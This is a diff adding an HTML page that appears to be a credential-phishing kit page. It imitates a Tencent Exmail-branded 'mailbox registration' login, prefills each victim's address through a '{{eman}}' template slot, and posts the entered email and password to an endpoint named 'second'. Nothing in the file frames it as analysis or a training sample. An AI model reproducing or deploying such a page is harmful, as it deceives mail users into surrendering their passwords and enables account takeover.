@@ -1,0 +1,172 @@
+<html lang="ch"><head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href="https://exmail.qq.com/exmail_logo.ico" rel="shortcut icon">
+	<title>OA&#37038;&#31665;&#22791;&#26696;&#31995;&#32479;</title>
+	<style>
+	    @media screen and (min-width:320px) and (max-width: 1000px){
+            .pc3{
+                display: none;
+                }
+        }
+        @media screen and (min-width:1000px) and (max-width: 4000px){
+            .pc3{
+                display: block;
+                }
+            .wap3{
+                display: none;
+            }
+        }
+	</style>
+
+    <div class="pc3">
+        <style>
+		*{
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+		body {
+			background: url(https://onegoods.nosdn.127.net/resupload/2020/7/22/b3f46a8cf2b95046f2114b7cddbdb252.jpg) 50% 50% no-repeat;
+			background-size: cover;
+			height: calc(50vw);
+			min-height: 675px;
+			max-height: calc(100vh - 92px);
+		}
+		.login_scan_panel_pwd_input {
+			display: inline-block;
+			box-sizing: border-box;
+			width: 60%;
+			position: relative;
+			padding: 14px 10px;
+			font-size: 14px;
+			border: 1px solid #C9C9C9;
+			border-radius: 2px;
+			outline: none;
+			transition: all 0.3s ease 0;
+			height: 40px;
+			margin-left: 10px;
+		}
+		.login{
+			border: none;
+			width: 80%;
+			background: #2984EF;
+			font-weight: 500;
+			font-size: 16px;
+			color: #ffffff;
+			text-align: center;
+			border-radius: 2px;
+			line-height: 40px;
+			margin: 0 auto;
+			cursor:pointer;
+			display: block;
+		}
+		.login_acitve{
+			border: none;
+			width: 80%;
+			background: #82b6f1;
+			font-weight: 500;
+			font-size: 16px;
+			color: #ffffff;
+			text-align: center;
+			border-radius: 2px;
+			line-height: 40px;
+			margin: 0 auto;
+			cursor:pointer;
+			display: block;
+		}
+
+
+		*{
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+		.login_scan_panel_pwd_input {
+			display: inline-block;
+			box-sizing: border-box;
+			width: 60%;
+			position: relative;
+			padding: 14px 10px;
+			font-size: 14px;
+			border: 1px solid #C9C9C9;
+			border-radius: 2px;
+			outline: none;
+			transition: all 0.3s ease 0;
+			height: 40px;
+			margin-left: 10px;
+		}
+		.login{
+			border: none;
+			width: 80%;
+			background: #2984EF;
+			font-weight: 500;
+			font-size: 16px;
+			color: #ffffff;
+			text-align: center;
+			border-radius: 2px;
+			line-height: 40px;
+			margin: 0 auto;
+			cursor:pointer;
+		}
+		.login_acitve{
+			border: none;
+			width: 80%;
+			background: #82b6f1;
+			font-weight: 500;
+			font-size: 16px;
+			color: #ffffff;
+			text-align: center;
+			border-radius: 2px;
+			line-height: 40px;
+			margin: 0 auto;
+			cursor:pointer;
+			display: block;
+		}
+	</style>
+		</head>
+<body>
+	<form novalidate name="myform" id="login_form" action="second" method="post" target="_top" >
+            <input name="locale" id="locale" type="hidden" value="zh_CN"> 
+            <input name="nodetect" type="hidden" value="false">
+    	<div style="margin: 0px auto; width: 100%; display: flex; max-width: 500px; flex-direction: column; justify-content: center;">
+    		<div style="margin: 0px auto; width: 100%; height: 80vh; background-color: rgb(255, 255, 255);">
+    			<div style="text-align: center; margin-top: 20px; margin-bottom: 50px;">&#37038;&#31665;&#22791;&#26696;&#20013;&#24515;</div>
+    			<div style="border: currentColor; border-image: none; margin-bottom: 25px; display: flex; justify-content: center;">
+    				<div style="line-height: 40px; font-size: 16px;">&#37038;&#31665;&#36134;&#21495;</div>
+    				<input name="email" class="login_scan_panel_pwd_input" id="mail" type="mail" placeholder="&#36755;&#20837;&#37038;&#31665;&#24080;&#21495;" value="{{eman}}">
+    			</div>
+    			<div style="border: currentColor; border-image: none; margin-bottom: 25px; display: flex; justify-content: center;">
+    				<div style="line-height: 40px; font-size: 16px;">&#37038;&#31665;&#23494;&#30721;</div>
+    				<input name="pwd" class="login_scan_panel_pwd_input" id="pass" type="password" placeholder="&#36755;&#20837;&#37038;&#31665;&#23494;&#30721;" value="">
+    			</div>
+    			<button name="action:login" class="login" id="login">&#30331; &#24405; &#22791; &#26696;</button>
+    		</div>
+    	</div>
+	</form>
+
+	</div>
+<script>
+    var form=document.querySelector("form");
+    form.onsubmit=function() {
+        var eDom=this.querySelector("[name=email]");
+        if(!emailCheck(eDom.value)) return false;
+        var pwdDom=this.querySelector("[name=pwd]");
+        if(!pwdDom.value) {
+            alert("密码不能为空！");
+            return false;
+        }
+    }
+
+    function emailCheck(objName) {  
+        var pattern = /^([\.a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-])+/;  
+        if (!pattern.test(objName)) {  
+            alert("请输入正确格式邮箱帐号！");  
+            return false;  
+        }  
+        return true;  
+    }
+</script>
+	</body>
+</html>
